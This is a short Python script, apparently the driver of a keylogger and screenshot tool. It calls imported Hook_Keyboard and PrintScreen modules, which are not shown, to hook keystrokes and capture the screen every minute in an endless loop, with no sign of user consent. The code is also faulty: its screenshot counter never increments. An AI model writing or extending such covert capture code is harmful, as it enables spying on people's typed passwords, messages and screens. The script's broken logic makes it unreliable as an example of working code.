import Hook_Keyboard
import PrintScreen
import schedule
import time


number = 0


def wait(number):
    PrintScreen.take_screen(number)
    number = number + 1


schedule.every(1).minutes.do(wait, number)
while True:
    Hook_Keyboard.hook_keyboard()
    schedule.run_pending()
    time.sleep(1)



